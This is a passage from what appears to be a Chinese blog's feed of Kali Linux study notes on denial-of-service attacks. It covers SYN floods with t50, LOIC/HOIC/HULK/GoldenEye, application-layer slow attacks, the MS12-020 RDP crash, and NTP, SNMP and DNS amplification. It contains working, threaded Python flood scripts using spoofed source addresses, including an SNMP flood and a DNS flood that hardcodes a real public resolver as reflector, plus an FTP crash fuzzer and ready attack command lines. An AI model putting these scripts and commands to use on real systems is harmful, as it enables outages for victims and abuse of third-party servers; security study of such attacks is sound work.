<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：t50 Metasploit的IP --flood --turbo -S --protocol TCP --dport 80</code></strong></li>
<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<h4 id="9-实验–匿名者拒绝服务工具包"><a href="#9-实验–匿名者拒绝服务工具包" class="headerlink" title="9. 实验–匿名者拒绝服务工具包"></a>9. 实验–匿名者拒绝服务工具包</h4><ul>
<li>▲ 工具包都为.exe文件，所以可能无法在Kali上运行（即使有mono界面/wine程序）</li>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li>使用LOIC攻击进行尝试，浏览器访问Metasploit尝试连接（更改Attack options进行尝试）</li>
<li>使用HOIC攻击进行尝试，浏览器访问Metasploit尝试连接（不要下载Booster）</li>
<li>使用DDoSer攻击进行尝试，浏览器访问Metasploit尝试连接（字符界面）</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/LOIC.PNG" srcset="/img/loading.gif" alt="LOIC"></p>
<p><img src="/images/kali/kali-notepad/HOIC.PNG" srcset="/img/loading.gif" alt="HOIC"></p>
<p><img src="/images/kali/kali-notepad/DDoSer.PNG" srcset="/img/loading.gif" alt="DDoSer"></p>
<h4 id="10-实验–HULK"><a href="#10-实验–HULK" class="headerlink" title="10. 实验–HULK"></a>10. 实验–HULK</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li>从物理机拷贝HULK工具</li>
<li><strong><code>🔺命令：python hulk.py http://Metasploit的IP地址</code></strong></li>
<li>开启Wireshark抓包，Fllow → TCP Stream 查看GET数据包情况（多个数据包分析）</li>
<li>浏览器访问Metasploit尝试连接</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/HULK.PNG" srcset="/img/loading.gif" alt="HULK"></p>
<h4 id="11-实验–GoldenEye"><a href="#11-实验–GoldenEye" class="headerlink" title="11. 实验–GoldenEye"></a>11. 实验–GoldenEye</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
<li><strong><code>🔺命令：./goldeneye.py http://Metasploit的IP地址 -w 50</code></strong></li>
<li>浏览器访问Metasploit尝试连接</li>
<li>开启Wireshark抓包，查看数据包</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/GoldenEye.PNG" srcset="/img/loading.gif" alt="GoldenEye"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十六)：应用层DoS</title>
    <url>/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/</url>
    <content><![CDATA[<hr>
<h4 id="1-应用层DoS"><a href="#1-应用层DoS" class="headerlink" title="1. 应用层DoS"></a>1. 应用层DoS</h4><ul>
<li>应用服务漏洞<ul>
<li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li>
<li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li>
</ul>
</li>
<li>缓冲区溢出漏洞<ul>
<li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li>
<li>影响：远程代码执行、DoS</li>
<li>利用模糊测试方法发现缓冲区溢出漏洞</li>
</ul>
</li>
<li>CesarFTP 0.99服务漏洞<ul>
<li>ftp_fuzz.py  #MKD/RMD（特殊字符：/n）</li>
</ul>
</li>
<li>MS12-020远程桌面协议DoS漏洞</li>
<li>Slowhttptest（源自google）<ul>
<li>低带宽应用层慢速DoS攻击（相对于CC等快速攻击而言的慢速）</li>
<li>最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）</li>
<li>尤其擅长攻击apache、tomcat（几乎百发百中）</li>
<li>支持代理</li>
<li>大量应用服务器和安全设备都无法防护慢速攻击</li>
</ul>
</li>
<li>Slowhttptest攻击方法<ul>
<li>Slowloris、Slow HTTP POST攻击<ul>
<li>耗尽应用的并发连接池，类似于Http层的Syn flood（非TCP连接数）</li>
<li>HTTP协议默认在服务器全部被接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS</li>
<li>Slowloris：完整的http请求结尾是\r\n\r\n，攻击发\r\n…..</li>
<li>Slow POST：HTTP头content-length声明长度，但body部分缓慢发送</li>
</ul>
</li>
<li>Slow Read attack<ul>
<li>与slowloris and slow POST目的相同，都是耗尽应用的并发连接池</li>
<li>不同之处在于请求正常发送，但慢速读取响应数据</li>
<li>攻击者调整TCP window窗口大小，是服务器慢速返回数据</li>
</ul>
</li>
<li>Apache Range Header attack<ul>
<li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li>
<li>耗尽服务器CPU、内存资源</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-a start</td>
<td align="center">start value of ranges-specifier for range header test</td>
</tr>
<tr>
<td align="center">-b bytes</td>
<td align="center">limit of range-specifier for range header test</td>
</tr>
<tr>
<td align="center">-c number of connections</td>
<td align="center">limited of 65539</td>
</tr>
<tr>
<td align="center">-d proxy host:port</td>
<td align="center">for directing all traffic through web proxy</td>
</tr>
<tr>
<td align="center">-e proxy host:port</td>
<td align="center">for directing only probe traffic through web proxy</td>
</tr>
<tr>
<td align="center">-H,B,R or X</td>
<td align="center">specify to slow down in headers section or in message body,-R enables range test,-X enables slow read test</td>
</tr>
<tr>
<td align="center">-g</td>
<td align="center">generate statistics in CSV and HTML formats,pattern is slow_xxx.csv/heml,where xxx is the time and date</td>
</tr>
<tr>
<td align="center">-i seconfs</td>
<td align="center">interval between follow up datai seconds,per connection</td>
</tr>
<tr>
<td align="center">-k pipeline factor</td>
<td align="center">number of times to repeat the request in the same connection for slow read test if server supports HTTP pipe-lining</td>
</tr>
<tr>
<td align="center">-l seconds</td>
<td align="center">test duration in seconds</td>
</tr>
<tr>
<td align="center">-n seconds</td>
<td align="center">interval between read operation from receive buffer</td>
</tr>
<tr>
<td align="center">-o file</td>
<td align="center">custom output file path and/or name,effective if -g is specified</td>
</tr>
<tr>
<td align="center">-p seconds</td>
<td align="center">timeout to wait for HTTP response on probe connction,after which serber is considered inaccessible</td>
</tr>
<tr>
<td align="center">-r connections per second</td>
<td align="center">connection rate</td>
</tr>
<tr>
<td align="center">-s bytes</td>
<td align="center">value of Content-Length header,if -B specified</td>
</tr>
<tr>
<td align="center">-t verb</td>
<td align="center">custom verb to use</td>
</tr>
<tr>
<td align="center">-u URL</td>
<td align="center">target URL,the same formaat you type in browser,eg https:host[:port]</td>
</tr>
<tr>
<td align="center">-v level</td>
<td align="center">verbosity level of log 0-4</td>
</tr>
<tr>
<td align="center">-w bytes</td>
<td align="center">start of range the advertised window size would be picked from</td>
</tr>
<tr>
<td align="center">-x bytes</td>
<td align="center">max length of follow up data</td>
</tr>
<tr>
<td align="center">-y bytes</td>
<td align="center">end of range the advertised window size would be picked from</td>
</tr>
<tr>
<td align="center">-z bytes</td>
<td align="center">bytes to read from receive buffer with single read() operation</td>
</tr>
</tbody></table>
<h4 id="2-实验–CesarFTP-0-99服务漏洞"><a href="#2-实验–CesarFTP-0-99服务漏洞" class="headerlink" title="2. 实验–CesarFTP 0.99服务漏洞"></a>2. 实验–CesarFTP 0.99服务漏洞</h4><ul>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>保存从主机下载的CesarFTP，并安装保存，打开运行程序Server（需要通过防火墙）</li>
<li>双击打开CesarFTP控制端程序进行配置 → 用户/组 → 添加用户 → anonymous</li>
<li>文件存取权限 → 选取一个文件夹作为主目录</li>
<li>cmd → <strong><code>🔺命令：netstat -nao</code></strong>查看21端口是否开启</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：./ftp_fuzz.py</code></strong></li>
<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
#_*_ coding:utf-8 _*_

import socket
import sys

if len(sys.argv) != 6:
    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [载荷] [步长] [最大长度]&quot;
    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 A 100 1000&quot;
    sys.exit()

ip = str(sys.argv[1])
port = int(sys.argv[2])
char = sys.argv[3]
i= int(sys.argv[4])
step = int(sys.argv[4])
max= int(sys.argv[5])
user = raw_input(str(&quot;FTP账号：&quot;))
passwd = raw_input(str(&quot;FTP密码：&quot;))
command = raw_input(str(&quot;FTP命令：&quot;))

while i &lt;=max:
    try:
        payload = command + &quot; &quot;+ (char*i)
        print &quot;已发送&quot;+str(i)+&quot;个（ &quot;+ char + &quot;）&quot;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connect=s.connect((ip,port))
        s.recv(1024)
        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)
        s.recv(1024)
        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)
        s.recv(1024)
        s.send(payload+&quot;\r\n&quot;)
        s.send(&quot;QUIT\r\n&quot;)
        s.recv(1024)
        s.close()
        i = i + step
    except:
        print &quot;\n服务已崩溃&quot;
        sys.exit()

print &quot;\n未发现缓冲区溢出漏洞&quot;</code></pre><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：./ftp_fuzz1.py</code></strong></li>
<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
#_*_ coding:utf-8 _*_

import socket
import sys

if len(sys.argv) != 5:
    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [步长] [最大长度]&quot;
    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 100 1000&quot;
    sys.exit()

ip = str(sys.argv[1])
port = int(sys.argv[2])
i= int(sys.argv[3])
step = int(sys.argv[3])
max= int(sys.argv[4])
user = raw_input(str(&quot;FTP账号：&quot;))
passwd = raw_input(str(&quot;FTP密码：&quot;))
command = raw_input(str(&quot;FTP命令：&quot;))

while i &lt;=max:
    try:
        payload = command + &quot; &quot;+ (&quot;\n&quot;*i)
        print &quot;已发送&quot;+str(i)+&quot;个换行符&quot;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connect=s.connect((ip,port))
        s.recv(1024)
        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)
        s.recv(1024)
        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)
        s.recv(1024)
        s.send(payload+&quot;\r\n&quot;)
        s.send(&quot;QUIT\r\n&quot;)
        s.recv(1024)
        s.close()
        i = i + step
    except:
        print &quot;\n服务已崩溃&quot;
        sys.exit()

print &quot;\n未发现缓冲区溢出漏洞&quot;</code></pre><h4 id="3-实验–MS12-020远程桌面协议DoS漏洞"><a href="#3-实验–MS12-020远程桌面协议DoS漏洞" class="headerlink" title="3. 实验–MS12-020远程桌面协议DoS漏洞"></a>3. 实验–MS12-020远程桌面协议DoS漏洞</h4><ul>
<li>Window XP SP3<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>⭐ 2020.2.11开启远程桌面</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
在Terminal Server键下，你将发现一个名为fDenyTSConnection的REG_DWORD型键值。双击这个键值打开“编辑DWORD值”对话框，把1(禁用远程桌面)改成0(启用远程桌面)</code></pre></blockquote>
<ul>
<li>Kali<ul>
<li><strong><code>🔺命令：searchsploit ms12-020</code></strong></li>
<li><strong><code>🔺命令：cat /usr/share/exploitdb/platforms/windows/doc/18606.txt</code></strong></li>
<li>下载termdd_1.dat</li>
<li><strong><code>🔺命令：nc Window XP SP3的IP 3389 &lt; termdd_1.dat</code></strong>（多次运行才可能生效）</li>
</ul>
</li>
</ul>
<h4 id="4-实验–Slowhttptest"><a href="#4-实验–Slowhttptest" class="headerlink" title="4. 实验–Slowhttptest"></a>4. 实验–Slowhttptest</h4><ul>
<li>Metasploit<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>浏览器访问Metasploit尝试连接</li>
<li>slowhttptest<ul>
<li>-c（建立的连接数，最大值为65539）</li>
<li>-H（slowloris攻击方式）</li>
<li>-g/-o（输出结果）</li>
<li>-i（间隔的时间）</li>
<li>-r（请求速率也即每次建立的连接数）</li>
<li>-t（请求的方法）</li>
<li>-u（攻击的URL）</li>
<li>-p（三秒不回则为宕机）</li>
<li>-l（攻击时间）</li>
<li>-B（HTTP POST 攻击模式）</li>
</ul>
</li>
<li>▲ slowloris 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u http://Metasploit的IP -x 24 -p 3</code></strong> </li>
</ul>
</li>
<li>▲ Apache Range Header attack 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -R -u http://Metasploit的IP -t HEAD -c 1000 -a 10 -b 3000 -r 500</code></strong></li>
</ul>
</li>
<li>▲ HTTP POST 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://Metasploit的IP -x 10 -p 3</code></strong></li>
</ul>
</li>
<li>▲ Slow Read attack 攻击模式<ul>
<li><strong><code>🔺命令：slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://Metasploit的IP -p 3</code></strong></li>
</ul>
</li>
<li>浏览器访问Metasploit尝试连接，在根目录下生成my_header_stats.csv/my_header_stats.html文件</li>
<li>定制连接数：<strong><code>🔺命令：ulimite -n 70000</code></strong></li>
</ul>
</li>
</ul>
<h4 id="5-另类的拒绝服务"><a href="#5-另类的拒绝服务" class="headerlink" title="5. 另类的拒绝服务"></a>5. 另类的拒绝服务</h4><ul>
<li>炸邮箱<ul>
<li>使用垃圾邮件塞满邮箱</li>
</ul>
</li>
<li>无意识的/非故意的拒绝服务攻击<ul>
<li>数据库服务器宕机恢复后引用队列大量请求洪水涌来</li>
<li>告警邮件在邮件服务器修改地址后洪水攻击防火墙</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十五)：DoS--NTP放大</title>
    <url>/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7/</url>
    <content><![CDATA[<hr>
<h4 id="1-NTP放大攻击"><a href="#1-NTP放大攻击" class="headerlink" title="1. NTP放大攻击"></a>1. NTP放大攻击</h4><ul>
<li>网络时间协议<ul>
<li>Network Time Protocol </li>
<li>保证网络设备时间同步</li>
<li>电子设备互相干扰导致时钟差异越来越大</li>
<li>服务端口UDP 123</li>
<li>▲ SSL证书的时间戳</li>
<li>▲ 影响应用正常运行、日志审计不可信</li>
</ul>
</li>
<li>攻击原理<ul>
<li>NTP服务提monlist（MON_GETLIST）查询功能<ul>
<li>监控NTP服务器的状态</li>
</ul>
</li>
<li>客户端查询时，NTP服务器返回最后同步时间的600个客户端IP<ul>
<li>每6个IP一个数据包，最多100个数据包（放大约100倍）</li>
</ul>
</li>
<li>放大效果看monlist的地址列表</li>
</ul>
</li>
<li>攻击对策<ul>
<li>升级到ntpd 4.2.7p26及以上的版本（默认关闭monlist查询）</li>
<li>收到关闭monlist查询功能</li>
</ul>
</li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Bodhi（被攻击者）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：sudo apt-get install ntp</code></strong></li>
<li><strong><code>🔺命令：netstat -pantu | grep 123</code></strong>（查看ntp服务是否开启）</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>发现NTP服务：<strong><code>🔺命令：nmap -sU -p123 Bodhi的IP</code></strong></li>
<li>发现漏洞<ul>
<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（timeout）</li>
</ul>
</li>
</ul>
</li>
<li>Bodhi（被攻击者）<ul>
<li><strong><code>🔺命令：vi /etc/ntp.conf</code></strong> <ul>
<li>#restrict -4 default kod nomodify notrap nopeer noquery </li>
<li>#restrict -6 default kod nomodify notrap nopeer noquery</li>
</ul>
</li>
<li><strong><code>🔺命令：service ntp stop/start</code></strong></li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li><strong><code>🔺命令：ntpdc -n -c monlist Bodhi的IP</code></strong>（可查询到monlist地址表）</li>
<li><strong><code>🔺命令：ntpq -c rv Bodhi的IP</code></strong>（查询Bodhi的系统信息）</li>
<li><strong><code>🔺命令：ntpdc -c sysinfo Bodhi的IP</code></strong>（查询Bodhi的sysinfo）</li>
<li>▲ 2020.2.10 无法查到monlist地址表，但能查到Bodhi得系统信息</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十四)：DoS--SNMP放大</title>
    <url>/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/</url>
    <content><![CDATA[<hr>
<h4 id="1-SNMP放大攻击"><a href="#1-SNMP放大攻击" class="headerlink" title="1. SNMP放大攻击"></a>1. SNMP放大攻击</h4><ul>
<li>简单网络管理协议（▲ 实际中主要运用为网络设备的监视）<ul>
<li>Simple Network Management Protocol</li>
<li>服务端口UDP 161/162</li>
<li>▲ 主动监控 → 被管理设备161端口，被动监控 → 管理设备162端口</li>
<li>管理站（manager/客户端）、被管理设备（agent/服务端）</li>
<li>管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li>
<li>每一个节点都有一个对象标识符（OID）来唯一的标识</li>
<li>IETF定义标准的MIB库/厂家自定义MIB库</li>
</ul>
</li>
<li>攻击原理<ul>
<li>请求流量小，查询结果返回流量大</li>
<li>结合伪造源地址实现攻击</li>
</ul>
</li>
</ul>
<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
<li>Window Server 2003<ul>
<li>安装SNMP服务器（Win+R → appwiz.cpl → 更改或添加程序 → 管理和监控工具 → 简单网络管理协议SNMP，可能需要光盘）<ul>
<li>Win+R → services.msc → SNMP Service → 代理 → 服务全选</li>
<li>Win+R → services.msc → SNMP Service → 安全 → 团体（Community）</li>
<li>添加 → 团队权限（只读）、团队名称（asd）</li>
<li>接受来自任何主机的SNMP数据包</li>
</ul>
</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，网卡模式为Bridge方式</li>
</ul>
</li>
<li>Kali<ul>
<li>IP头构造<ul>
<li>i=IP()</li>
<li>i.dst=”Window Server 2003的IP地址”</li>
<li>i.display()</li>
</ul>
</li>
<li>UDP头构造<ul>
<li>u=udp()</li>
<li>u.dport=161</li>
<li>u.sport=161</li>
<li>u.display()</li>
</ul>
</li>
<li>SNMP头构造<ul>
<li>s=SNMP()</li>
<li>s.community=”asd”</li>
<li>s.display()</li>
</ul>
</li>
<li>SNMP内容构造<ul>
<li>b=SNMPbulk() </li>
<li>b.display() </li>
<li>b.max_repetitions=100（修改此数可增大回包数据大小）</li>
<li>b.varbindlist=[SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.1’)),SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.19.1.3’))] </li>
</ul>
</li>
<li>拼接数据<ul>
<li>s.PDU=b </li>
<li>s.display()</li>
</ul>
</li>
<li>发送数据包<ul>
<li>r= (i/u/s)</li>
<li>r.display()</li>
<li>Sr1(r)</li>
</ul>
</li>
<li>▲ Kali开启Wireshark抓包，监听Kali的IP地址，查看返回的数据包的大小（出现分段数据包）</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
#_*_ coding:utf-8 _*_

from scapy.all import *
from time import sleep
import thread
import random
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)

if len(sys.argv) != 6:
    print &quot;用法：./dns_flood.py [利用的IP地址] [攻击的IP地址] [回包数据大小] [团体] [线程数]&quot;
    print &quot;举例：./dns_flood.py 1.1.1.1 1.1.1.2 100 asd 20&quot;
    sys.exit()

target = str(sys.argv[1])
tar = str(sys.argv[2])
datapacket = int(sys.argv[3])
person = str(sys.argv[4])
threads = int(sys.argv[5])

print &quot;正在执行 SNMP Flood 攻击，按 Ctrl+C 停止攻击&quot;
def snmpflood(target,datapacket,person,tar):
    while 0 == 0:
        x = random.randint(0,65535)
        send(IP(dst=target,src=tar)/UDP(sport=x,dport=161)/SNMP(community=person,PDU=SNMPbulk(max_repetitions=datapacket,varbindlist=[SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.1&#39;)),SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.19.1.3&#39;))])),verbose=0)

for x in range(0,threads):
    thread.start_new_thread(snmpflood,(target,datapacket,person,tar))

while 0 == 0:
    sleep(1)</code></pre><p><img src="/images/kali/kali-notepad/SNMP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" srcset="/img/loading.gif" alt="SNMP放大攻击"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十三)：DoS--DNS放大</title>
    <url>/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7/</url>
    <content><![CDATA[<hr>
<h4 id="1-DNS放大攻击"><a href="#1-DNS放大攻击" class="headerlink" title="1. DNS放大攻击"></a>1. DNS放大攻击</h4><ul>
<li>产生大流量的攻击方法<ul>
<li>单机的带宽优势</li>
<li>巨大单机数量形成的流量汇聚</li>
<li>利用协议特性实现放大效果的流量</li>
</ul>
</li>
<li>DNS协议放大效果<ul>
<li>查询请求流量小，但响应流量可能非常巨大</li>
<li><strong><code>🔺命令：dig hp.com @202.96.134.133</code></strong>（流量放大约8倍）</li>
</ul>
</li>
<li>攻击原理<ul>
<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS</li>
</ul>
</li>
</ul>
<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
<li>Kali开启Wireshark抓包，监听Kali的IP地址</li>
<li>IP/UDP/DNS/DNS查询内容</li>
<li>IP头构造<ul>
<li>i=IP()</li>
<li>i.dst=”202.96.134.133”</li>
<li>i.src=”被攻击者的IP”</li>
<li>i.display()</li>
</ul>
</li>
<li>UDP头构造<ul>
<li>u=udp()</li>
<li>u.display()</li>
</ul>
</li>
<li>DNS头构造<ul>
<li>d=DNS()</li>
<li>d.rd=1（递归查询）</li>
<li>d.qdount=1</li>
<li>d.display()</li>
</ul>
</li>
<li>DNS内容构造<ul>
<li>q=DNSQR()</li>
<li>q.qname=”hp.com”</li>
<li>q.qtype=255（A为默认记录，255即查所有记录）</li>
<li>q.display()</li>
</ul>
</li>
<li>拼接数据<ul>
<li>d.qd=q</li>
<li>d.display()</li>
</ul>
</li>
<li>发送数据包<ul>
<li>r=(i/u/d)</li>
<li>r.display()</li>
<li>sr1(r)</li>
<li>▲ 发包：send(r)（可用Kali进行发包，物理机进行接收数据包）</li>
</ul>
</li>
<li>▲ 结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</li>
<li><strong><code>🔺命令：./dns_flood.py 被攻击者的IP hp.com 20</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
#_*_ coding:utf-8 _*_

from scapy.all import *
from time import sleep
import thread
import random
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print &quot;用法：./dns_flood.py [IP地址] [利用的域名] [线程数]&quot;
    print &quot;举例：./dns_flood.py 1.1.1.1 hp.com 20&quot;
    sys.exit()

target = str(sys.argv[1])
dnsname = str(sys.argv[2])
threads = int(sys.argv[3])

print &quot;正在执行 DNS Flood 攻击，按 Ctrl+C 停止攻击&quot;
def dnsflood(target,dnsname):
    while 0 == 0:
        x = random.randint(0,65535)
        send(IP(dst=&quot;202.96.134.133&quot;,src=target)/UDP(sport=x,dport=53)/DNS(rd=1,qdcount=1,qd=DNSQR(qname=dnsname,qtype=255)),verbose=0)

for x in range(0,threads):
    thread.start_new_thread(dnsflood,(target,dnsname))

while 0 == 0:
    sleep(1)</code></pre><p><img src="/images/kali/kali-notepad/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" srcset="/img/loading.gif" alt="DNS放大攻击"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十二)：TearDrop</title>
    <url>/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/</url>
    <content><![CDATA[<hr>
<h4 id="1-TearDrop"><a href="#1-TearDrop" class="headerlink" title="1. TearDrop"></a>1. TearDrop</h4><ul>
<li>主要针对早期微软操作系统（95、98、3.X、nt）<ul>
<li>近些年有人发现对2.x版本的android系统、6.0 IOS系统攻击有效</li>
</ul>
</li>
<li>原理很有趣<ul>
<li>使用IP分段偏移值实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li>
</ul>
</li>
<li>攻击效果<ul>
<li>被攻击者蓝屏、重启、卡死</li>
</ul>
</li>
<li>IP分段偏移值的数据包，以Window10下的 <strong><code>🔺命令：ping -l 4000 192.168.0.1</code></strong></li>
</ul>
<p><img src="/images/kali/kali-notepad/IP%E5%88%86%E6%AE%B5%E5%81%8F%E7%A7%BB%E5%80%BC.PNG" srcset="/img/loading.gif" alt="IP分段偏移值"></p>
<p><img src="/images/kali/kali-notepad/TearDrop.PNG" srcset="/img/loading.gif" alt="TearDrop攻击"></p>
<ul>
<li>Ping大包，比较正常分段与teardrop攻击流量的区别</li>
<li>针对早期windows系统SMB协议的攻击<ul>
<li><strong><code>🔺命令：./teardrop_smb.py</code></strong></li>
<li>针对Android、IOS系统的攻击</li>
<li><strong><code>🔺命令：./teardrop_android_ios.py</code></strong></li>
<li>攻击向量并不确定，要是具体协议分析</li>
<li>▲ 2020.2.9搜索不到两个python文件</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(八十一)：Sockstress</title>
    <url>/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/</url>
    <content><![CDATA[<hr>
<h4 id="1-Sockstress"><a href="#1-Sockstress" class="headerlink" title="1. Sockstress"></a>1. Sockstress</h4><ul>
<li>2008年由Jack C.Louis发现</li>
<li>针对TCP服务的拒绝服务攻击<ul>
<li>消耗被攻击目标系统资源，不消耗网络带宽自宽</li>
<li>与攻击目标建立socket连接</li>
<li>▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据）</li>
